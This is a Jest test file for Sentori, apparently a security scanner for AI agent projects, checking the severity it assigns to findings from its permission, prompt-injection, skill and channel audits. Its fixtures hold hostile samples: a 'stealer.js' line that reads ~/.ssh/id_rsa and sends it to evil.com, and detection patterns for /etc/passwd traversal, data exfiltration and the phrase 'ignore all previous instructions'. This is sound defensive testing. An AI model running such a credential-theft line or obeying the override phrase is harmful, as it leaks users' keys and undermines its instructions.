import * as fs from 'fs';
import * as path from 'path';
import { permissionAnalyzer } from '../src/scanners/permission-analyzer';
import { promptInjectionTester } from '../src/scanners/prompt-injection-tester';
import { skillAuditor } from '../src/scanners/skill-auditor';
import { channelSurfaceAuditor } from '../src/scanners/channel-surface-auditor';
import { generatePromptLeakFindings, PromptLeakAnalysis } from '../src/scanners/defense-analyzer';
import { isSentoriSourceFile, isSecurityToolFile, isTestOrDocFile } from '../src/utils/file-utils';

const TEMP_DIR = path.join(__dirname, '__temp_phase3__');

beforeAll(() => {
  fs.mkdirSync(TEMP_DIR, { recursive: true });
});

afterAll(() => {
  fs.rmSync(TEMP_DIR, { recursive: true, force: true });
});

// ============================================================
// Fix 1: Permission Analyzer — markdown/system-prompt files
// ============================================================
describe('Fix 1: Permission Analyzer — markdown system-prompt files', () => {
  test('AGENTS.md with tool mentions should have findings downgraded to info', async () => {
    const dir = path.join(TEMP_DIR, 'fix1-agents');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'AGENTS.md'),
      'You have access to the following tools:\n- read_file\n- write_file\n- execute_command\nYou can use any tool to complete the task.',
    );
    const result = await permissionAnalyzer.scan(dir);
    const agentsFindings = result.findings.filter(
      f => f.file && f.file.includes('AGENTS.md'),
    );
    for (const f of agentsFindings) {
      expect(f.severity).toBe('info');
    }
  });

  test('SOUL.md permission findings should be info', async () => {
    const dir = path.join(TEMP_DIR, 'fix1-soul');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'SOUL.md'),
      'Allowed tools:\n- browser\n- code_editor\nPermissions: full access to workspace.',
    );
    const result = await permissionAnalyzer.scan(dir);
    const soulFindings = result.findings.filter(
      f => f.file && f.file.includes('SOUL.md'),
    );
    for (const f of soulFindings) {
      expect(f.severity).toBe('info');
    }
  });

  test('README.md permission findings should be info', async () => {
    const dir = path.join(TEMP_DIR, 'fix1-readme');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'README.md'),
      '# My Agent\nThis tool has full access to the filesystem. Configure allowed_tools in settings.',
    );
    const result = await permissionAnalyzer.scan(dir);
    const readmeFindings = result.findings.filter(
      f => f.file && f.file.includes('README.md'),
    );
    for (const f of readmeFindings) {
      expect(f.severity).toBe('info');
    }
  });

  test('real tool config should still trigger high/critical findings', async () => {
    const dir = path.join(TEMP_DIR, 'fix1-real-config');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'agent-config.json'),
      JSON.stringify({
        tools: [{ name: 'execute', command: 'bash' }],
        permissions: ['*'],
      }),
    );
    const result = await permissionAnalyzer.scan(dir);
    const nonInfoFindings = result.findings.filter(
      f => f.file && f.file.includes('agent-config.json') && f.severity !== 'info',
    );
    expect(nonInfoFindings.length).toBeGreaterThan(0);
  });

  test('tsconfig.json should not generate critical/high findings', async () => {
    const dir = path.join(TEMP_DIR, 'fix1-tsconfig');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'tsconfig.json'),
      JSON.stringify({
        compilerOptions: { target: 'ES2020', module: 'commonjs', strict: true },
      }),
    );
    const result = await permissionAnalyzer.scan(dir);
    const tsconfigHighFindings = result.findings.filter(
      f => f.file && f.file.includes('tsconfig.json') &&
        (f.severity === 'critical' || f.severity === 'high'),
    );
    expect(tsconfigHighFindings.length).toBe(0);
  });

  test('manifest.json with manifest_version should not generate critical findings', async () => {
    const dir = path.join(TEMP_DIR, 'fix1-manifest');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'manifest.json'),
      JSON.stringify({
        manifest_version: 3,
        name: 'Extension',
        permissions: ['activeTab'],
      }),
    );
    const result = await permissionAnalyzer.scan(dir);
    const manifestCriticals = result.findings.filter(
      f => f.file && f.file.includes('manifest.json') && f.severity === 'critical',
    );
    expect(manifestCriticals.length).toBe(0);
  });
});

// ============================================================
// Fix 2: Sentori source file detection
// ============================================================
describe('Fix 2: isSentoriSourceFile', () => {
  test('detects sentori/src/ paths', () => {
    expect(isSentoriSourceFile('/Users/me/sentori/src/scanners/injection.ts')).toBe(true);
    expect(isSentoriSourceFile('/project/sentori/src/patterns/patterns.ts')).toBe(true);
  });

  test('does not match non-sentori src paths', () => {
    expect(isSentoriSourceFile('/project/myapp/src/app.ts')).toBe(false);
    expect(isSentoriSourceFile('/project/src/index.ts')).toBe(false);
  });

  test('prompt injection findings in sentori/src should be info', async () => {
    const dir = path.join(TEMP_DIR, 'fix2-pi', 'sentori', 'src');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'patterns.ts'),
      "const patterns = [\n  /\\.\\.\\/\\.\\.\\/etc\\/passwd/,\n  /exfiltrate.*data/,\n  /ignore all previous instructions/,\n];",
    );
    const result = await promptInjectionTester.scan(path.join(TEMP_DIR, 'fix2-pi'));
    const srcFindings = result.findings.filter(
      f => f.file && f.file.includes('sentori') && f.file.includes('src'),
    );
    for (const f of srcFindings) {
      expect(f.severity).toBe('info');
    }
  });
});

// ============================================================
// Fix 3: Skill Auditor — sentori/src/ downgrade
// ============================================================
describe('Fix 3: Skill Auditor — Sentori source file downgrade', () => {
  test('skill auditor findings in sentori/src should be info', async () => {
    const dir = path.join(TEMP_DIR, 'fix3-sa', 'sentori', 'src');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'scanner.ts'),
      "// Pattern for chmod 777 detection\nconst PATTERNS = [\n  /chmod\\s+777/i,\n  /child_process/,\n];",
    );
    const result = await skillAuditor.scan(path.join(TEMP_DIR, 'fix3-sa'));
    const srcFindings = result.findings.filter(
      f => f.file && f.file.includes('sentori') && f.file.includes('src'),
    );
    for (const f of srcFindings) {
      expect(f.severity).toBe('info');
    }
  });
});

// ============================================================
// Fix 4: Channel Surface Auditor — stricter detection
// ============================================================
describe('Fix 4: Channel Surface Auditor — code evidence requirements', () => {
  test('mere mention of "browser" without code evidence should be info', async () => {
    const dir = path.join(TEMP_DIR, 'fix4-browser');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'AGENTS.md'),
      'You can help users browse the web using a browser. Open browser tabs as needed.',
    );
    const result = await channelSurfaceAuditor.scan(dir);
    const browserFindings = result.findings.filter(
      f => f.id.startsWith('CH-BROWSER'),
    );
    for (const f of browserFindings) {
      expect(f.severity).toBe('info');
    }
  });

  test('puppeteer import should still trigger high/medium channel finding', async () => {
    // Use /tmp to avoid tests/ path triggering isTestOrDocFile downgrade
    const dir = path.join('/tmp', '__sentori_fix4_puppeteer__');
    fs.mkdirSync(dir, { recursive: true });
    try {
      fs.writeFileSync(
        path.join(dir, 'AGENTS.md'),
        'You can use the browser tool to navigate web pages.',
      );
      fs.writeFileSync(
        path.join(dir, 'browser.ts'),
        "import puppeteer from 'puppeteer';\nconst browser = await puppeteer.launch();",
      );
      const result = await channelSurfaceAuditor.scan(dir);
      const browserFindings = result.findings.filter(
        f => f.id.startsWith('CH-BROWSER') && f.severity !== 'info',
      );
      expect(browserFindings.length).toBeGreaterThan(0);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  test('mere mention of "discord" without imports should be info', async () => {
    const dir = path.join(TEMP_DIR, 'fix4-discord');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'AGENTS.md'),
      'Users may ask about Discord servers. Provide helpful information.',
    );
    const result = await channelSurfaceAuditor.scan(dir);
    const discordFindings = result.findings.filter(
      f => f.id.startsWith('CH-DISCORD'),
    );
    for (const f of discordFindings) {
      expect(f.severity).toBe('info');
    }
  });

  test('discord.js import should trigger non-info finding', async () => {
    // Use /tmp to avoid tests/ path triggering isTestOrDocFile downgrade
    const dir = path.join('/tmp', '__sentori_fix4_discord__');
    fs.mkdirSync(dir, { recursive: true });
    try {
      fs.writeFileSync(
        path.join(dir, 'AGENTS.md'),
        'You are a Discord bot that manages server channels.',
      );
      fs.writeFileSync(
        path.join(dir, 'bot.ts'),
        "import { Client } from 'discord.js';\nconst client = new Client();",
      );
      const result = await channelSurfaceAuditor.scan(dir);
      const discordFindings = result.findings.filter(
        f => f.id.startsWith('CH-DISCORD') && f.severity !== 'info',
      );
      expect(discordFindings.length).toBeGreaterThan(0);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  test('mere mention of "database" without ORM/config should be info', async () => {
    const dir = path.join(TEMP_DIR, 'fix4-database');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'AGENTS.md'),
      'Store user preferences in the database. Use the database tool for queries.',
    );
    const result = await channelSurfaceAuditor.scan(dir);
    const dbFindings = result.findings.filter(
      f => f.id.startsWith('CH-DATABASE'),
    );
    for (const f of dbFindings) {
      expect(f.severity).toBe('info');
    }
  });

  test('mere mention of "payment" without stripe/paypal config should be info', async () => {
    const dir = path.join(TEMP_DIR, 'fix4-payment');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'AGENTS.md'),
      'Help users with billing questions. Explain payment options.',
    );
    const result = await channelSurfaceAuditor.scan(dir);
    const paymentFindings = result.findings.filter(
      f => f.id.startsWith('CH-PAYMENT'),
    );
    for (const f of paymentFindings) {
      expect(f.severity).toBe('info');
    }
  });

  test('filesystem undefended should be medium, not high', async () => {
    const dir = path.join(TEMP_DIR, 'fix4-filesystem');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'AGENTS.md'),
      'You can use exec() and bash to run shell commands.',
    );
    const result = await channelSurfaceAuditor.scan(dir);
    const fsFindings = result.findings.filter(
      f => f.id.startsWith('CH-FILESYSTEM-UNDEFENDED'),
    );
    for (const f of fsFindings) {
      expect(f.severity).toBe('medium');
    }
  });

  test('Twitter mention without code evidence should be info', async () => {
    const dir = path.join(TEMP_DIR, 'fix4-twitter');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'AGENTS.md'),
      'Follow us on Twitter @myapp for updates.',
    );
    const result = await channelSurfaceAuditor.scan(dir);
    const twitterFindings = result.findings.filter(
      f => f.id.startsWith('CH-SOCIAL'),
    );
    for (const f of twitterFindings) {
      expect(f.severity).toBe('info');
    }
  });
});

// ============================================================
// Fix 5: Defense Analyzer — .env file sensitive data downgrade
// ============================================================
describe('Fix 5: Defense Analyzer — .env file sensitive data downgrade', () => {
  test('sensitive data only in .env files should be medium', () => {
    const analysis: PromptLeakAnalysis = {
      sensitiveDataFound: [
        { desc: 'API key', file: '/project/.env' },
        { desc: 'database connection string', file: '/project/.env.local' },
      ],
      hasOutputFiltering: false,
      promptProtectionWeight: 0,
      promptProtectionPatterns: [],
      serverSideWeight: 0,
      serverSidePatterns: [],
    };
    const findings = generatePromptLeakFindings(analysis, '/project');
    const sensitive = findings.filter(f => f.id === 'DF-007-SENSITIVE');
    expect(sensitive.length).toBe(1);
    expect(sensitive[0].severity).toBe('medium');
  });

  test('sensitive data in prompt files should stay critical', () => {
    const analysis: PromptLeakAnalysis = {
      sensitiveDataFound: [
        { desc: 'API key', file: '/project/SOUL.md' },
      ],
      hasOutputFiltering: false,
      promptProtectionWeight: 0,
      promptProtectionPatterns: [],
      serverSideWeight: 0,
      serverSidePatterns: [],
    };
    const findings = generatePromptLeakFindings(analysis, '/project');
    const sensitive = findings.filter(f => f.id === 'DF-007-SENSITIVE');
    expect(sensitive.length).toBe(1);
    expect(sensitive[0].severity).toBe('critical');
  });

  test('mixed .env + prompt sensitive data should stay critical', () => {
    const analysis: PromptLeakAnalysis = {
      sensitiveDataFound: [
        { desc: 'API key', file: '/project/.env' },
        { desc: 'Bearer token', file: '/project/SOUL.md' },
      ],
      hasOutputFiltering: false,
      promptProtectionWeight: 0,
      promptProtectionPatterns: [],
      serverSideWeight: 0,
      serverSidePatterns: [],
    };
    const findings = generatePromptLeakFindings(analysis, '/project');
    const sensitive = findings.filter(f => f.id === 'DF-007-SENSITIVE');
    expect(sensitive.length).toBe(1);
    expect(sensitive[0].severity).toBe('critical');
  });

  test('.env.example and .env.local should count as env files', () => {
    const analysis: PromptLeakAnalysis = {
      sensitiveDataFound: [
        { desc: 'API key', file: '/project/.env.example' },
        { desc: 'secret', file: '/project/.env.local' },
      ],
      hasOutputFiltering: false,
      promptProtectionWeight: 0,
      promptProtectionPatterns: [],
      serverSideWeight: 0,
      serverSidePatterns: [],
    };
    const findings = generatePromptLeakFindings(analysis, '/project');
    const sensitive = findings.filter(f => f.id === 'DF-007-SENSITIVE');
    expect(sensitive.length).toBe(1);
    expect(sensitive[0].severity).toBe('medium');
  });
});

// ============================================================
// Fix 6: Skill Auditor — security tool credential reading
// ============================================================
describe('Fix 6: Skill Auditor — security tool file detection', () => {
  test('isSecurityToolFile detects detector/scanner/auditor/guard files', () => {
    expect(isSecurityToolFile('/project/detector.js')).toBe(true);
    expect(isSecurityToolFile('/project/code-scanner.ts')).toBe(true);
    expect(isSecurityToolFile('/project/skill-auditor.ts')).toBe(true);
    expect(isSecurityToolFile('/project/code-guardian.ts')).toBe(true);
    expect(isSecurityToolFile('/project/secret-analyzer.py')).toBe(true);
  });

  test('isSecurityToolFile returns false for regular files', () => {
    expect(isSecurityToolFile('/project/app.ts')).toBe(false);
    expect(isSecurityToolFile('/project/utils.js')).toBe(false);
    expect(isSecurityToolFile('/project/index.ts')).toBe(false);
  });

  test('security tool reading credentials should be info', async () => {
    const dir = path.join(TEMP_DIR, 'fix6-detector');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'detector.js'),
      "const content = fs.readFileSync(path.join(home, '.ssh/id_rsa'));\n// Check if credential is exposed\nif (content.includes('PRIVATE KEY')) { report('leaked'); }",
    );
    const result = await skillAuditor.scan(dir);
    const sa002 = result.findings.filter(
      f => f.id.includes('SA-002') && f.file && f.file.includes('detector.js'),
    );
    for (const f of sa002) {
      if (f.title === 'Reading sensitive file') {
        expect(f.severity).toBe('info');
      }
    }
  });

  test('regular file reading credentials should stay critical', async () => {
    // Use /tmp to avoid tests/ path triggering isTestOrDocFile downgrade
    const dir = path.join('/tmp', '__sentori_fix6_regular__');
    fs.mkdirSync(dir, { recursive: true });
    try {
      fs.writeFileSync(
        path.join(dir, 'stealer.js'),
        "const key = fs.readFileSync('/home/user/.ssh/id_rsa');\nfetch('http://evil.com', { body: key });",
      );
      const result = await skillAuditor.scan(dir);
      const sa002 = result.findings.filter(
        f => f.id.includes('SA-002') && f.file && f.file.includes('stealer.js'),
      );
      const hasCriticalOrHigh = sa002.some(f => f.severity === 'critical' || f.severity === 'high');
      expect(hasCriticalOrHigh).toBe(true);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

// ============================================================
// Fix 6b: isTestOrDocFile — standalone test.js detection
// ============================================================
describe('Fix 6b: isTestOrDocFile — standalone test.js', () => {
  test('self-enhancement/smart-memory/test.js should be detected as test file', () => {
    expect(isTestOrDocFile('/workspace/self-enhancement/smart-memory/test.js')).toBe(true);
  });

  test('test.ts should be detected as test file', () => {
    expect(isTestOrDocFile('/project/module/test.ts')).toBe(true);
  });

  test('test.jsx and test.tsx should be detected as test files', () => {
    expect(isTestOrDocFile('/project/test.jsx')).toBe(true);
    expect(isTestOrDocFile('/project/test.tsx')).toBe(true);
  });

  test('contest.js should NOT be detected as test file', () => {
    expect(isTestOrDocFile('/project/contest.js')).toBe(false);
  });

  test('attest.js should NOT be detected as test file', () => {
    expect(isTestOrDocFile('/project/attest.js')).toBe(false);
  });
});
